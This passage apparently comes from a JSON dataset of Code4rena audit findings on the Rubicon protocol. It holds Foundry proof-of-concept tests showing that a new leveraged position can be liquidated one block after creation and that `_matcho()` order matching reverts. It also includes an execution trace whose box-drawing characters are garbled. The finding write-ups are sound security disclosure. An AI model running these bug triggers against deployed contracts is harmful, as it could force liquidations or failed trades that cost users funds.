\"../../contracts/utilities/poolsUtility/Position.sol\";\nimport \"../../contracts/utilities/poolsUtility/PoolsUtility.sol\";\n\nimport \"forge-std/Test.sol\";\n\ncontract PositionTest is Test {\n  //========================CONSTANTS========================\n  address public owner;\n  address FEE_TO = 0x0000000000000000000000000000000000000FEE;\n  // core contracts\n  RubiconMarket market;\n  Comptroller comptroller;\n  BathHouseV2 bathHouse;\n\n  DummyPriceOracle oracle;\n\n  // test tokens\n  TokenWithFaucet TEST;\n  TokenWithFaucet TUSDC;\n\n  CErc20 cTEST;\n  CErc20 cTUSDC;\n\n  address alice = 0x0000000000000000000000000000000000000123;\n  address bob = 0x0000000000000000000000000000000000000124;\n\n  function setUp() public {\n    owner = msg.sender;\n    // deploy Comptroller instance\n    comptroller = new Comptroller();\n\n    // deploy new Market instance and init\n    market = new RubiconMarket();\n    market.initialize(FEE_TO);\n    market.setFeeBPS(10);\n\n    // deploy test tokens\n    TEST = new TokenWithFaucet(address(this), \"Test\", \"TEST\", 18);\n    TUSDC = new TokenWithFaucet(address(this), \"Test Stablecoin\", \"TUSDC\", 6);\n    vm.label(address(TEST),\"TEST\");\n    vm.label(address(TUSDC),\"TUSDC\");\n\n    // baseRate = 0.3, multiplierPerYear = 0.02\n    WhitePaperInterestRateModel irModel = new WhitePaperInterestRateModel(3e17, 2e16);\n    CErc20Delegate bathTokenImplementation = new CErc20Delegate();\n\n    bathHouse = new BathHouseV2();\n    bathHouse.initialize(address(comptroller),address(this));\n    bathHouse.createBathToken(address(TEST), irModel, 1e18, address(bathTokenImplementation), \"\");\n    bathHouse.createBathToken(address(TUSDC), irModel, 1e18, address(bathTokenImplementation), \"\");\n\n    cTEST = CErc20(bathHouse.getBathTokenFromAsset(address(TEST)));\n    cTUSDC = CErc20(bathHouse.getBathTokenFromAsset(address(TUSDC)));\n\n    // 1:1 for simplicity\n    oracle = new DummyPriceOracle();\n    oracle.addCtoken(cTUSDC,1e30);\n    oracle.addCtoken(cTEST,1e18);\n\n    comptroller._supportMarket(cTEST);\n    comptroller._supportMarket(cTUSDC);\n    comptroller._setPriceOracle(oracle);\n    comptroller._setCloseFactor(0.5e18); // 0.5 close factor, same as compound mainnet\n    comptroller._setLiquidationIncentive(1.08e18); // 8% same as compound mainnet\n    comptroller._setCollateralFactor(cTEST,0.7e18);\n    comptroller._setCollateralFactor(cTUSDC,0.7e18);\n\n    TEST.mint(address(bob),100e18);\n    vm.startPrank(bob);\n    TEST.approve(address(cTEST),50e18);\n    cTEST.mint(50e18);\n    vm.stopPrank();\n\n    // add some $$$ to the Market\n    TEST.faucet();\n    TUSDC.faucet();\n    TEST.approve(address(market), type(uint256).max);\n    TUSDC.approve(address(market), type(uint256).max);\n\n    market.offer(100e6, TUSDC, 100e18, TEST);\n  }\n\n  function test_LiquidatePositionAfterCreation() public {\n    PoolsUtility pools = new PoolsUtility();\n    pools.initialize(address(oracle),address(market),address(bathHouse));\n\n    vm.prank(alice);\n    pools.createPosition();\n\n    address[] memory positions = pools.getPositions(alice);\n    Position position = Position(positions[0]);\n\n    uint256 amount = 10e6;\n    TUSDC.mint(alice,amount);\n    vm.startPrank(alice);\n    TUSDC.approve(address(position),amount);\n    position.sellAllAmountWithLeverage(\n        address(TUSDC),\n        address(TEST),\n        amount,\n        1e18\n    );\n    vm.stopPrank();\n\n    (, uint256 liquidity, uint256 shortfall) = comptroller.getAccountLiquidity(address(position));\n    assertEq(0,liquidity);\n    // position under water\n    assertEq(0,shortfall);\n\n    // next block\n    vm.roll(block.number + 1);\n\n    // trigger interest calculation\n    uint256 borrowBalance = cTEST.borrowBalanceCurrent(address(position));\n\n    (, liquidity, shortfall) = comptroller.getAccountLiquidity(address(position));\n    assertEq(0,liquidity);\n    assertGt(shortfall,0);\n\n    // becomes liquidated\n    vm.startPrank(bob);\n    TEST.approve(address(cTEST),borrowBalance/2);\n    cTEST.liquidateBorrow(address(position),borrowBalance/2,cTUSDC);\n    vm.stopPrank();\n  }\n}\n```\n\n`closeFactor` and `liquidationIncentive` is the same as compound on mainnet.\n\nAdded a mint function in the `TokenWithFaucet`:\n```solidity\n    function mint(address account, uint256 amount) external {\n        _mint(account, amount);\n    }\n```\n\n## Tools Used\nmanual audit, forge\n\n## Recommended Mitigation Steps\nIntroduce a safety factor to scale the loans with that the user can provide when opening the position.\n",
      "metadata": {
        "Severity": "High",
        "Difficulty": null,
        "Type": "bug",
        "Finding ID": null,
        "Target": null
      }
    },
    {
      "index": 1243,
      "page_start": null,
      "heading": "1243. The ````_matcho()```` is not implemented properly",
      "heading_cleaned": "The ````_matcho()```` is not implemented properly",
      "markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L1313\n\n\n# Vulnerability details\n\n## Impact\nThe ````_matcho()```` function is not implemented properly, it might revert while the taking amount is greater than the best offer's amount, leads to order matching failure.\n\n## Proof of Concept\nThe following test script shows how to trigger the issue.\n```solidity\npragma solidity ^0.8.0;\n\nimport \"../../contracts/compound-v2-fork/WhitePaperInterestRateModel.sol\";\nimport \"../../contracts/compound-v2-fork/ComptrollerInterface.sol\";\nimport \"../../contracts/compound-v2-fork/CErc20Delegator.sol\";\nimport \"../../contracts/compound-v2-fork/CErc20Delegate.sol\";\nimport \"../../contracts/compound-v2-fork/Comptroller.sol\";\nimport \"../../contracts/utilities/MarketAidFactory.sol\";\nimport \"../../contracts/periphery/TokenWithFaucet.sol\";\nimport \"../../contracts/utilities/MarketAid.sol\";\nimport \"../../contracts/periphery/WETH9.sol\";\nimport \"../../contracts/RubiconMarket.sol\";\nimport \"forge-std/Test.sol\";\n\n/// @notice proxy isn't used here\ncontract MatchingOfferNotWorking is Test {\n  //========================CONSTANTS========================\n  address public owner;\n  address FEE_TO = 0x0000000000000000000000000000000000000FEE;\n  address taker = address(0x1234);\n  address maker = address(0x5678);\n  // core contracts\n  RubiconMarket market;\n  // test tokens\n  TokenWithFaucet RUBI;\n  TokenWithFaucet USDC;\n\n  // deployRubiconProtocolFixture()\n  function setUp() public {\n    owner = msg.sender;\n\n    // deploy new Market instance and init\n    market = new RubiconMarket();\n    market.initialize(FEE_TO);\n    market.setFeeBPS(10);\n\n    // deploy test tokens\n    RUBI = new TokenWithFaucet(address(this), \"RUBI\", \"RUBI\", 18);\n    USDC = new TokenWithFaucet(address(this), \"Test Stablecoin\", \"USDC\", 6);\n\n    // add some $$$ to victim and attacker\n    RUBI.faucet();\n    USDC.faucet();\n    RUBI.transfer(maker, 1000e18);\n    USDC.transfer(taker, 10000e6);\n\n    vm.startPrank(taker);\n    USDC.approve(address(market), type(uint256).max);\n    vm.stopPrank();\n\n    vm.startPrank(maker);\n    RUBI.approve(address(market), type(uint256).max);\n    vm.stopPrank();\n  }\n\n  //========================MARKET_TESTS========================\n\n  function test_MatchingOfferNotWorking() public {\n   // 1. maker submits an offer for selling 1 RUBI at 100 USDC/RUBI\n    uint256 makerRubiBalanceBefore = RUBI.balanceOf(maker);\n    vm.startPrank(maker);\n    uint256 id = market.offer(1e18, RUBI, 100e6, USDC);\n    vm.stopPrank();\n    assertGt(id, 0);\n    uint256 makerRubiBalanceAfter = RUBI.balanceOf(maker);\n    assertEq(makerRubiBalanceBefore - makerRubiBalanceAfter, 1e18);\n\n    // 2. now the taker submits another offer for buying 10 RUBI at 100 USDC/RUBI\n    //    we expect the above selling offer to be fulfilled successfully.\n    //    Meanwhile, a new 9 RUBI buying offer should be created,\n    //    but actually the this offer will be reverted.\n    vm.startPrank(taker);\n    // buying RUBI/USDC at 100 USDC/RUBI\n    vm.expectRevert();\n    id = market.offer(1000e6, USDC, 10e18, RUBI);\n    vm.stopPrank();\n  }\n\n}\n\n```\n\nAnd the log details\n```solidity\nRunning 1 test for test/foundry-tests/MatchingOfferNotWorking.t.sol:MatchingOfferNotWorking\n[PASS] test_MatchingOfferNotWorking() (gas: 422566)\nTraces:\n  [422566] MatchingOfferNotWorking::test_MatchingOfferNotWorking()\n    â”œâ”€ [2629] TokenWithFaucet::balanceOf(0x0000000000000000000000000000000000005678) [staticcall]\n    â”‚   â””â”€ â† 1000000000000000000000\n    â”œâ”€ [0] VM::startPrank(0x0000000000000000000000000000000000005678)\n    â”‚   â””â”€ â† ()\n    â”œâ”€ [246628] RubiconMarket::offer(1000000000000000000, TokenWithFaucet: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], 100000000, TokenWithFaucet: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a])\n    â”‚   â”œâ”€ [30321] TokenWithFaucet::transferFrom(0x0000000000000000000000000000000000005678, RubiconMarket: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1000000000000000000)\n    â”‚   â”‚   â”œâ”€ emit Transfer(from: 0x0000000000000000000000000000000000005678, to: RubiconMarket: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 1000000000000000000)\n    â”‚   â”‚   â””â”€ â† true\n    â”‚   â”œâ”€ emit LogItemUpdate(id: 1)\n    â”‚   â”œâ”€ emit emitOffer(id: 0x0000000000000000000000000000000000000000000000000000000000000001, pair: 0x466a72696a5097346305fd11b91586c4ba7becfaf99e93d36de04eca0fe58148, maker: 0x0000000000000000000000000000000000005678, pay_gem: TokenWithFaucet: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], buy_gem: TokenWithFaucet: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], pay_amt: 1000000000000000000, buy_amt: 100000000)\n    â”‚   â”œâ”€ emit LogSortedOffer(id: 1)\n    â”‚   â””â”€ â† 1\n    â”œâ”€ [0] VM::stopPrank()\n    â”‚   â””â”€ â† ()\n    â”œâ”€ [629] TokenWithFaucet::balanceOf(0x0000000000000000000000000000000000005678) [staticcall]\n    â”‚   â””â”€ â† 999000000000000000000\n    â”œâ”€ [0] VM::startPrank(0x0000000000000000000000000000000000001234)\n    â”‚   â””â”€ â† ()\n    â”œâ”€ [0] VM::expectRevert()\n    â”‚   â””â”€ â† ()\n    â”œâ”€ [167743] RubiconMarket::offer(1000000000, TokenWithFaucet: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], 10000000000000000000, TokenWithFaucet: [0x2e234DAe75C793f67A35089C9d99245E1C58470b])\n    â”‚   â”œâ”€ [32321] TokenWithFaucet::transferFrom(0x0000000000000000000000000000000000001234, 0x0000000000000000000000000000000000000FEE, 9999)\n    â”‚   â”‚   â”œâ”€ emit Transfer(from: 0x0000000000000000000000000000000000001234, to: 0x0000000000000000000000000000000000000FEE, value: 9999)\n    â”‚   â”‚   â””â”€ â† true\n    â”‚   â”œâ”€ [25521] TokenWithFaucet::transferFrom(0x0000000000000000000000000000000000001234, 0x0000000000000000000000000000000000005678, 99990000)\n    â”‚   â”‚   â”œâ”€ emit Transfer(from: 0x0000000000000000000000000000000000001234, to: 0x0000000000000000000000000000000000005678, value: 99990000)\n    â”‚   â”‚   â””â”€ â† true\n    â”‚   â”œâ”€ [24995] TokenWithFaucet::transfer(0x0000000000000000000000000000000000001234, 999900000000000000)\n    â”‚   â”‚   â”œâ”€ emit Transfer(from: RubiconMarket: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: 0x0000000000000000000000000000000000001234, value: 999900000000000000)\n    â”‚   â”‚   â””â”€ â† true\n    â”‚   â”œâ”€ emit LogItemUpdate(id: 1)\n    â”‚   â”œâ”€ emit emitTake(id: 0x0000000000000000000000000000000000000000000000000000000000000001, pair: 0x466a72696a5097346305fd11b91586c4ba7becfaf99e93d36de04eca0fe58148, taker: 0x0000000000000000000000000000000000001234, maker: 0x0000000000000000000000000000000000005678, pay_gem: TokenWithFaucet: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], buy_gem: TokenWithFaucet: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], take_amt: 999900000000000000, give_amt: 99990000)\n    â”‚   â”œâ”€ emit emitFee(id: 0x0000000000000000000000000000000000000000000000000000000000000001, taker: 0x0000000000000000000000000000000000001234, feeTo: 0x0000000000000000000000000000000000000FEE, pair: 0x466a72696a5097346305fd11b91586c4ba7becfaf99e93d36de04eca0fe58148, asset: TokenWithFaucet: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], feeAmt: 9999)\n    â”‚   â”œâ”€ emit LogMatch(id: 0, amount: 1000000000000000000)\n    â”‚   â”œâ”€ [3621] TokenWithFaucet::transferFrom(0x0000000000000000000000000000000000001234, 0x0000000000000000000000000000000000000FEE, 0)\n    â”‚   â”‚   â”œâ”€ emit Transfer(from: 0x0000000000000000000000000000000000001234, to: 0x0000000000000000000000000000000000000FEE, value: 0)\n    â”‚   â”‚   â””â”€ â† true\n    â”‚   â”œâ”€ [3621] TokenWithFaucet::transferFrom(0x0000000000000000000000000000000000001234, 0x0000000000000000000000000000000000005678, 9999)\n    â”‚   â”‚   â”œâ”€ emit Transfer(from: 0x0000000000000000000000000000000000001234, to: 0x0000000000000000000000000000000000005678, value: 9999)\n    â”‚   â”‚   â””â”€ â† true\n    â”‚   â”œâ”€ [3095] TokenWithFaucet::transfer(0x0000000000000000000000000000000000001234, 99990000000000)\n    â”‚   â”‚   â”œâ”€ emit Transfer(from: RubiconMarket: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: 0x0000000000000000000000000000000000001234, value: 99990000000000)\n    â”‚   â”‚   â””â”€ â† true\n    â”‚   â”œâ”€ emit LogItemUpdate(id: 1)\n    â”‚   â”œâ”€ emit emitTake(id: 0x0000000000000000000000000000000000000000000000000000000000000001, pair: 0x466a72696a5097346305fd11b91586c4ba7becfaf99e93d36de04eca0fe58148, taker: 0x0000000000000000000000000000000000001234, maker: 0x0000000000000000000000000000000000005678, pay_gem: TokenWithFaucet: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], buy_gem: TokenWithFaucet: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], take_amt: 99990000000000, give_amt: 9999)\n    â”‚   â”œâ”€ emit emitFee(id: 0x0000000000000000000000000000000000000000000000000000000000000001, taker: 0x0000000000000000000000000000000000001234, feeTo: 0x0000000000000000000000000000000000000FEE, pair: 0x466a72696a5097346305fd11b91586c4ba7becfaf99e93d36de04eca0fe58148, asset: TokenWithFaucet: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], feeAmt: 0)\n    â”‚   â”œâ”€ emit LogMatch(id: 0, amount: 100000000000000)\n    â”‚   â””â”€ â† \"EvmError: Revert\"\n    â”œâ”€ [0] VM::stopPrank()\n    â”‚   â””â”€ â† ()\n    â””â”€ â† ()\n\nTest result: ok. 1 passed; 0 failed; finished in 2.67ms\n```\n\nLet's take a look at this line, we find the actual ````take_amt```` is ````0.9999e18 RUBI```` rather than the expected ````1e18````, the difference is exact the 0.01% of fee.\n```solidity\nemit emitTake(id: 0x0000000000000000000000000000000000000000000000000000000000000001,\n pair: 0x466a72696a5097346305fd11b91586c4ba7becfaf99e93d36de04eca0fe58148,\n taker: 0x0000000000000000000000000000000000001234,\n maker: 0x0000000000000000000000000000000000005678,\n pay_gem: TokenWithFaucet: [0x2e234DAe75C793f67A35089C9d99245E1C58470b],\n buy_gem: TokenWithFaucet: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a],\n take_amt: 999900000000000000,\ngive_amt: 99990000)\n```\n\nBack to source code, we can see the issue arises on L1313 of ````_matcho()````,  where ````m_pay_amt```` should be some thing like ````m_pay_amt + fee````.\n\n```solidity\nFile: contracts\\RubiconMarket.sol\n1273:     function _matcho(\n1274:         uint256 t_pay_amt, //taker sell how much\n1275:         ERC20 t_pay_gem, //taker sell which token\n1276:         uint256 t_buy_amt, //taker buy how much\n1277:         ERC20 t_buy_gem, //taker buy which token\n1278:         uint256 pos, //position id\n1279:         bool rounding, //match \"close enough\" orders?\n1280:         address owner,\n1281:         address recipient\n1282:     ) internal returns (uint256 id) {\n1283:         uint256 best_maker_id; //highest maker id\n1284:         uint256 t_buy_amt_old; //taker buy how much saved\n1285:         uint256 m_buy_amt; //maker offer wants to buy this much token\n1286:         uint256 m_pay_amt; //maker offer wants to sell this much token\n1287:\n1288:         // there is at least one offer stored for token pair\n1289:         while (_best[address(t_buy_gem)][address(t_pay_gem)] > 0) {\n1290:             best_maker_id = _best[address(t_buy_gem)][address(t_pay_gem)];\n1291:             m_buy_amt = offers[best_maker_id].buy_amt;\n1292:             m_pay_amt = offers[best_maker_id].pay_amt;\n1293:\n...\n1313:             buy(best_maker_id, min(m_pay_amt, t_buy_amt));\n1314:             emit LogMatch(id, min(m_pay_amt, t_buy_amt));\n1315:             t_buy_amt_old = t_buy_amt;\n1316:             t_buy_amt = sub(t_buy_amt, min(m_pay_amt, t_buy_amt));\n1317:             t_pay_amt = mul(t_buy_amt, t_pay_amt) / t_buy_amt_old;\n1318:\n1319:             if (t_pay_amt == 0 || t_buy_amt == 0) {\n1320:                 break;\n1321:             }\n1322:         }\n1323:\n...\n1341:     }\n\n```\n\n## Tools Used\nManually review\n\n## Recommended Mitigation Steps\nSee PoC\n",
      "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L1313\n\n\n# Vulnerability details\n\n## Impact\nThe ````_matcho()```` function is not implemented properly, it might revert while the taking amount is greater than the best offer's amount, leads to order matching failure.\n\n## Proof of Concept\nThe following test script shows how to trigger the issue.\n```solidity\npragma solidity ^0.8.0;\n\nimport \"../../contracts/compound-v2-fork/WhitePaperInterestRateModel.sol\";\nimport \"../../contracts/compound-v2-fork/ComptrollerInterface.sol\";\nimport \"../../contracts/compound-v2-fork/CErc20Delegator.sol\";\nimport \"../../contracts/compound-v2-fork/CErc20Delegate.sol\";\nimport \"../../contracts/compound-v2-fork/Comptroller.sol\";\nimport \"../../contracts/utilities/MarketAidFactory.sol\";\nimport \"../../contracts/periphery/TokenWithFaucet.sol\";\nimport \"../../contracts/utilities/MarketAid.sol\";\nimport \"../../contracts/periphery/WETH9.sol\";\nimport \"../../contracts/RubiconMarket.sol\";\nimport \"forge-std/Test.sol\";\n\n/// @notice proxy isn't used here\ncontract MatchingOfferNotWorking is Test {\n  //========================CONSTANTS========================\n  address public owner;\n  address FEE_TO = 0x0000000000000000000000000000000000000FEE;\n  address taker = address(0x1234);\n  address maker = address(0x5678);\n  // core contracts\n  RubiconMarket market;\n  // test tokens\n  TokenWithFaucet RUBI;\n  TokenWithFaucet USDC;\n\n  // deployRubiconProtocolFixture()\n  function setUp() public {\n    owner = msg.sender;\n\n    // deploy new Market instance and init\n    market = new RubiconMarket();\n    market.initialize(FEE_TO);\n    market.setFeeBPS(10);\n\n    // deploy test tokens\n    RUBI = new TokenWithFaucet(address(this), \"RUBI\", \"RUBI\", 18);\n    USDC = new TokenWithFaucet(address(this), \"Test Stablecoin\", \"USDC\", 6);\n\n    // add some $$$ to victim and attacker\n    RUBI.faucet();\n    USDC.faucet();\n    RUBI.transfer(maker, 1000e18);\n    USDC.transfer(taker, 10000e6);\n\n    vm.startPrank(taker);\n    USDC.approve(address(market), type(uint256).max);\n    vm.stopPrank();\n\n    vm.startPrank(maker);\n    RUBI.approve(address(market), type(uint256).max);\n    vm.stopPrank();\n  }\n\n  //========================MARKET_TESTS========================\n\n  function test_MatchingOfferNotWorking() public {\n   // 1. maker submits an offer for selling 1 RUBI at 100 USDC/RUBI\n    uint256 makerRubiBalanceBefore = RUBI.balanceOf(maker);\n    vm.startPrank(maker);\n    uint256 id = market.offer(1e18, RUBI, 100e6, USDC); \n    vm.stopPrank();\n    assertGt(id, 0);\n    uint256 makerRubiBalanceAfter = RUBI.balanceOf(maker);\n    assertEq(makerRubiBalanceBefore - makerRubiBalanceAfter, 1e18);\n    \n    // 2. now the taker submits another offer for buying 10 RUBI at 100 USDC/RUBI\n    //    we expect the above selling offer to be fulfilled successfully.\n    //    Meanwhile, a new 9 RUBI buying offer should be created,\n    //    but actually the this offer will be reverted.\n    vm.startPrank(taker);\n    // buying RUBI/USDC at 100 USDC/RUBI\n    vm.expectRevert();\n    id = market.offer(1000e6, USDC, 10e18, RUBI); \n    vm.stopPrank();\n  }\n\n}\n\n```\n\nAnd the log details\n```solidity\nRunning 1 test for test/foundry-tests/MatchingOfferNotWorking.t.sol:MatchingOfferNotWorking\n[PASS] test_MatchingOfferNotWorking() (gas: 422566)\nTraces:\n  [422566] MatchingOfferNotWorking::test_MatchingOfferNotWorking()\n    â”œâ”€ [2629] TokenWithFaucet::balanceOf(0x0000000000000000000000000000000000005678) [staticcall]\n    â”‚   â””â”€ â† 1000000000000000000000\n    â”œâ”€ [0] VM::startPrank(0x0000000000000000000000000000000000005678)\n    â”‚   â””â”€ â† ()\n    â”œâ”€ [246628] RubiconMarket::offer(1000000000000000000, TokenWithFaucet: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], 100000000, TokenWithFaucet: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a])\n    â”‚   â”œâ”€ [30321] TokenWithFaucet::transferFrom(0x0000000000000000000000000000000000005678, RubiconMarket: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1000000000000000000)\n    â”‚   â”‚   â”œâ”€ emit Transfer(from: 0x0000000000000000000000000000000000005678, to: RubiconMarket: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 1000000000000000000)\n    â”‚   â”‚   â””â”€ â† true\n    â”‚   â”œâ”€ emit LogItemUpdate(id: 1)\n    â”‚   â”œâ”€ emit emitOffer(id: 0x0000000000000000000000000000000000000000000000000000000000000001, pair: 0x466a72696a5097346305fd11b91586c4ba7becfaf99e93d36de04eca0fe58148, maker: 0x0000000000000000000000000000000000005678, pay_gem: TokenWithFaucet: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], buy_gem: TokenWithFaucet: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], pay_amt: 1000000000000000000, buy_amt: 100000000)\n    â”‚   â”œâ”€ emit LogSortedOffer(id: 1)\n    â”‚   â””â”€ â† 1\n    â”œâ”€ [0] VM::stopPrank()\n    â”‚   â””â”€ â† ()\n    â”œâ”€ [629] TokenWithFaucet::balanceOf(0x0000000000000000000000000000000000005678) [staticcall]\n    â”‚   â””â”€ â† 999000000000000000000\n    â”œâ”€ [0] VM::startPrank(0x0000000000000000000000000000000000001234)\n    â”‚   â””â”€ â† ()\n    â”œâ”€ [0] VM::expectRevert()\n    â”‚   â””â”€ â† ()\n    â”œâ”€ [167743] RubiconMarket::offer(1000000000, TokenWithFaucet: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], 10000000000000000000, TokenWithFaucet: [0x2e234DAe75C793f67A35089C9d99245E1C58470b])\n    â”‚   â”œâ”€ [32321] TokenWithFaucet::transferFrom(0x0000000000000000000000000000000000001234, 0x0000000000000000000000000000000000000FEE, 9999)\n    â”‚   â”‚   â”œâ”€ emit Transfer(from: 0x0000000000000000000000000000000000001234, to: 0x0000000000000000000000000000000000000FEE, value: 9999)\n    â”‚   â”‚   â””â”€ â† true\n    â”‚   â”œâ”€ [25521] TokenWithFaucet::transferFrom(0x0000000000000000000000000000000000001234, 0x0000000000000000000000000000000000005678, 99990000)\n    â”‚   â”‚   â”œâ”€ emit Transfer(from: 0x0000000000000000000000000000000000001234, to: 0x0000000000000000000000000000000000005678, value: 99990000)\n    â”‚   â”‚   â””â”€ â† true\n    â”‚   â”œâ”€ [24995] TokenWithFaucet::transfer(0x0000000000000000000000000000000000001234, 999900000000000000)\n    â”‚   â”‚   â”œâ”€ emit Transfer(from: RubiconMarket: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: 0x0000000000000000000000000000000000001234, value: 999900000000000000)\n    â”‚   â”‚   â””â”€ â† true\n    â”‚   â”œâ”€ emit LogItemUpdate(id: 1)\n    â”‚   â”œâ”€ emit emitTake(id: 0x0000000000000000000000000000000000000000000000000000000000000001, pair: 0x466a72696a5097346305fd11b91586c4ba7becfaf99e93d36de04eca0fe58148, taker: 0x0000000000000000000000000000000000001234, maker: 0x0000000000000000000000000000000000005678, pay_gem: TokenWithFaucet: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], buy_gem: TokenWithFaucet: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], take_amt: 999900000000000000, give_amt: 99990000)\n    â”‚   â”œâ”€ emit emitFee(id: 0x0000000000000000000000000000000000000000000000000000000000000001, taker: 0x0000000000000000000000000000000000001234, feeTo: 0x0000000000000000000000000000000000000FEE, pair: 0x466a72696a5097346305fd11b91586c4ba7becfaf99e93d36de04eca0fe58148, asset: TokenWithFaucet: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], feeAmt: 9999)\n    â”‚   â”œâ”€ emit LogMatch(id: 0, amount: 1000000000000000000)\n    â”‚   â”œâ”€ [3621] TokenWithFaucet::transferFrom(0x0000000000000000000000000000000000001234, 0x0000000000000000000000000000000000000FEE, 0)\n    â”‚   â”‚   â”œâ”€ emit Transfer(from: 0x0000000000000000000000000000000000001234, to: 0x0000000000000000000000000000000000000FEE, value: 0)\n    â”‚   â”‚   â””â”€ â† true\n    â”‚   â”œâ”€ [3621] TokenWithFaucet::transferFrom(0x0000000000000000000000000000000000001234, 0x0000000000000000000000000000000000005678, 9999)\n    â”‚   â”‚   â”œâ”€ emit Transfer(from: 0x0000000000000000000000000000000000001234, to: 0x0000000000000000000000000000000000005678, value: 9999)\n    â”‚   â”‚   â””â”€ â† true\n    â”‚   â”œâ”€ [3095] TokenWithFaucet::transfer(0x0000000000000000000000000000000000001234, 99990000000000)\n    â”‚   â”‚   â”œâ”€ emit Transfer(from: RubiconMarket: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: 0x0000000000000000000000000000000000001234, value: 99990000000000)\n    â”‚   â”‚   â””â”€ â† true\n    â”‚   â”œâ”€ emit LogItemUpdate(id: 1)\n    â”‚   â”œâ”€ emit emitTake(id: 0x0000000000000000000000000000000000000000000000000000000000000001, pair: 0x466a72696a5097346305fd11b91586c4ba7becfaf99e93d36de04eca0fe58148, taker: 0x0000000000000000000000000000000000001234, maker: 0x0000000000000000000000000000000000005678, pay_gem: TokenWithFaucet: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], buy_gem: TokenWithFaucet: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], take_amt: 99990000000000, give_amt: 9999)\n    â”‚   â”œâ”€ emit emitFee(id: 0x0000000000000000000000000000000000000000000000000000000000000001, taker: 0x0000000000000000000000000000000000001234, feeTo: 0x0000000000000000000000000000000000000FEE, pair: 0x466a72696a5097346305fd11b91586c4ba7becfaf99e93d36de04eca0fe58148, asset: TokenWithFaucet: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], feeAmt: 0)\n    â”‚   â”œâ”€ emit LogMatch(id: 0, amount: 100000000000000)\n    â”‚   â””â”€ â† \"EvmError: Revert\"\n    â”œâ”€ [0] VM::stopPrank()\n    â”‚   â””â”€ â† ()\n    â””â”€ â† ()\n\nTest result: ok. 1 passed; 0 failed; finished in 2.67ms\n```\n\nLet's take a look at this line, we find the actual ````take_amt```` is ````0.9999e18 RUBI```` rather than the expected ````1e18````, the difference is exact the 0.01% of fee.\n```solidity\nemit emitTake(id: 0x0000000000000000000000000000000000000000000000000000000000000001,\n pair: 0x466a72696a5097346305fd11b91586c4ba7becfaf99e93d36de04eca0fe58148,\n taker: 0x0000000000000000000000000000000000001234,\n maker: 0x0000000000000000000000000000000000005678,\n pay_gem: TokenWithFaucet: [0x2e234DAe75C793f67A35089C9d99245E1C58470b],\n buy_gem: TokenWithFaucet: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a],\n take_amt: 999900000000000000, \ngive_amt: 99990000)\n```\n\nBack to source code, we can see the issue arises on L1313 of ````_matcho()````,  where ````m_pay_amt```` should be some thing like ````m_pay_amt + fee````.\n\n```solidity\nFile: contracts\\RubiconMarket.sol\n1273:     function _matcho(\n1274:         uint256 t_pay_amt, //taker sell how much\n1275:         ERC20 t_pay_gem, //taker sell which token\n1276:         uint256 t_buy_amt, //taker buy how much\n1277:         ERC20 t_buy_gem, //taker buy which token\n1278:         uint256 pos, //position id\n1279:         bool rounding, //match \"close enough\" orders?\n1280:         address owner,\n1281:         address recipient\n1282:     ) internal returns (uint256 id) {\n1283:         uint256 best_maker_id; //highest maker id\n1284:         uint256 t_buy_amt_old; //taker buy how much saved\n1285:         uint256 m_buy_amt; //maker offer wants to buy this much token\n1286:         uint256 m_pay_amt; //maker offer wants to sell this much token\n1287: \n1288:         // there is at least one offer stored for token pair\n1289:         while (_best[address(t_buy_gem)][address(t_pay_gem)] > 0) {\n1290:             best_maker_id = _best[address(t_buy_gem)][address(t_pay_gem)];\n1291:             m_buy_amt = offers[best_maker_id].buy_amt;\n1292:             m_pay_amt = offers[best_maker_id].pay_amt;\n1293: \n...\n1313:             buy(best_maker_id, min(m_pay_amt, t_buy_amt));\n1314:             emit LogMatch(id, min(m_pay_amt, t_buy_amt));\n1315:             t_buy_amt_old = t_buy_amt;\n1316:             t_buy_amt = sub(t_buy_amt, min(m_pay_amt, t_buy_amt));\n1317:             t_pay_amt = mul(t_buy_amt, t_pay_amt) / t_buy_amt_old;\n1318: \n1319:             if (t_pay_amt == 0 || t_buy_amt == 0) {\n1320:                 break;\n1321:             }\n1322:         }\n1323: \n...\n1341:     }\n\n```\n\n## Tools Used\nManually review\n\n## Recommended Mitigation Steps\nSee PoC",
      "description": null,
      "impact": "## Impact\nThe ````_matcho()```` function is not implemented properly, it might revert while the taking amount is greater than the best offer's amount, leads to order matching failure.\n",
